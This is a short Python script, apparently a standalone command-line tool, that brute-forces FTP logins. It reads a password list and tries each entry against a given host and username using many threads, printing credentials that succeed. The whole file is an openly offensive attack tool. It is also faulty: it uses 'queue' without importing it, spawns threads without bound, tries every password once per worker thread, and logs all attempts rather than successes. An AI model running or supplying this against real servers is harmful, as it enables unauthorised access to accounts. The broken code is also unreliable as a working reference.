import ftplib
import argparse
import getpass
import threading
import logging
import os
import ctypes

def brute_force_ftp(host, username, password, timeout=10):
    ftp = ftplib.FTP()
    ftp.timeout = timeout

    try:
        ftp.connect(host, timeout=timeout)
        ftp.login(username, password)
        print(f"Success: {username}:{password}")
        ftp.quit()
    except ftplib.all_errors:
        pass

def run_brute_force(host, username, password_list, results_queue, lock):
    for password in password_list:
        with lock:
            results_queue.put((host, username, password))

        thread = threading.Thread(target=brute_force_ftp, args=(host, username, password))
        thread.start()
        
def clear_console():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
        
def set_console_title(title):
    if os.name == "nt":
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleTitleW(title)        

def main():
    parser = argparse.ArgumentParser(description='Advanced FTP Brute Forcer')
    parser.add_argument('host', type=str, help='FTP server host')
    parser.add_argument('username', type=str, help='Username for the FTP server')
    parser.add_argument('password_file', type=str, help='Path to the file containing passwords')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads to use (default: 10)')
    parser.add_argument('--logfile', type=str, help='Path to the log file')

    args = parser.parse_args()

    with open(args.password_file, 'r') as f:
        passwords = [line.strip() for line in f.readlines()]

    results_queue = queue.Queue()
    lock = threading.Lock()

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=run_brute_force, args=(args.host, args.username, passwords, results_queue, lock))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    if args.logfile:
        logging.basicConfig(filename=args.logfile, level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    else:
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

    while not results_queue.empty():
        host, username, password = results_queue.get()
        logging.info(f"{host} - {username} - {password}")

if __name__ == '__main__':
    clear_console()
    set_console_title('Ftp Brut3F0rc3r')
    main()